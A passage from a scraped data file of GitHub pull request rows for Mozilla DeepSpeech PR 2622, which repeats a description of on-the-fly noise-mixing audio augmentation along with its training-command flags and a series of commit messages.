- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,66cc7c48c9e3d07d3ab742b6dc235e5b706349af,limit audio signal between +-1.0
1555,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b7eb0f4d4c6a9d070a4d718727fdb22d83146100,"[FIX] switch shuffle/map for memory cost, replace cache with prefetch for memory cost [MOD] deprecate FLAGS.audio_aug_mix_noise_cache"
1556,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ccae7cc93ef717f6045d3128c1aebdb6d8f5e858,[MOD] limit the buffer size of .shuffle() to protect memory usage
1557,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8cc95f9ee814d63a4a9c472921cca65662d3cbdd,[ADD] bin/normalize_noise_audio.py
1558,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e2648a47c04010e8ba28121fab9e0dd8f2bd010,[MOD] mix noise into complete audio
1559,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2269514a9ef676100b46f0c99c0e6a7150feb4dd,"[ADD] dev/test dataset can also mix noise [MOD] use SNR to balance noise/speech volume, refactor the called functions to accept noise arguments"
1560,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b8147ce8c4a1906de80f1db793b8aa63dc15045,"[ADD] use dbfs and SNR to determine the balance of audio/noise, add option to dump audio into tensorboard [FIX] correct gain db formula"
1561,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42bc45b198cdc3a3eff41fe369bf88d16b325163,"[FIX] audiofile_to_features & samples_to_mfccs return 3 values now, add FLAGS.train_augmentation_files as condition to judge cache dataset or not, change constant to FLAGS [MOD] rename variables"
1562,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,289722dc2ec81f4f446e152027b9dfdd263cb8ac,Fix issues.
1563,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9334e79f2888fc2c48c3f0815b56ab15205369c7,Save invalid files.
1564,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25736e00e4fee09194abc2aed6ad80402e6bea20,"Merge remote-tracking branch 'noiseaug/more-augment-options' into noisetest

# Conflicts:
#	DeepSpeech.py
#	evaluate.py
#	util/feeding.py
#	util/flags.py"
1565,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,40b431b1aefb98d1b7163c373b2a9a4f3a813623,Fix merging errors.
1566,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7d1279d2c4bd56d782db083a9d3d355f4239424,"[FIX] replace tqdm with prograssbar [ADD] separate speech/noise mixing, add option to mix multi noise into one audio [MOD] change FLAGS name, gla iterations is optional"
1567,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,77922262464c5c0fb9d2c5c90e9046f59769bb9d,Merge branch 'no-sort' into more-augment-options
1568,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
